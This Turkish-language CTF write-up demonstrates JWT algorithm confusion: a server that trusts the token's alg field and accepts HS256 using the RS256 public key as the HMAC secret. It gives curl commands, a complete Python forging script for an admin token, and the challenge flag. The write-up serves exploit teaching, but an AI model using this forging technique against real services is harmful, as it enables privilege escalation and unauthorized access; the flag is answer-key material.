# 🐧 JWT Algorithm Confusion

 Bu proje, yanlış yapılandırılmış JWT doğrulaması sonucu ortaya çıkan JWT Algorithm Confusion (Algoritma Karmaşası) zafiyetini göstermektedir.


###  Bu uygulamada sunucu:

 JWT içindeki alg alanına güveniyor
 RS256 yerine HS256 kullanımına izin veriyor
 Public key’i HMAC secret gibi kullanıyor

 ### Sonuç olarak saldırgan:

 Kendi admin token’ını üretip yetki yükseltebilir.

 ## Exploit Adımları:

 ## 1-)   Normal kullanıcı olarak giriş yapalım

Öncelikle register/login işlemi yaparak bir JWT token elde edilir.

Admin endpoint test edilir:

curl -k https://nihilist.skydays.ctf/api/admin/flag \
  -H "Authorization: Bearer TOKEN"

## 2-)   Public key’i indirelim

curl -k https://nihilist.skydays.ctf/.well-known/public.pem -o public.pem
head -n 2 public.pem


## 3-)   Sahte JWT üretme script’i oluşturalım
### script :
cat > forge.py << 'PY'

import base64, json, hmac, hashlib
from datetime import datetime, timezone, timedelta

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

with open("public.pem", "rb") as f:
    secret = f.read()

now = datetime.now(timezone.utc)
iat = int(now.timestamp())
exp = int((now + timedelta(minutes=30)).timestamp())

header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "merve",
    "role": "admin",
    "admin": True,
    "iat": iat,
    "exp": exp,
    "iss": "service"
}

h = b64url(json.dumps(header, separators=(",", ":"), sort_keys=True).encode())
p = b64url(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode())
msg = f"{h}.{p}".encode()

sig = hmac.new(secret, msg, hashlib.sha256).digest()
s = b64url(sig)

print(f"{h}.{p}.{s}")

PY


## 4-)   Sahte token üretelim.

FORGED=$(python3 forge.py)
echo "$FORGED"

## 5-)    Admin endpoint’e erişelim.

curl -k https://nihilist.skydays.ctf/api/admin/flag \
      -H "Authorization: Bearer $FORGED"

      



## FLAG = SKYDAYS{lo_siento_wilson} 
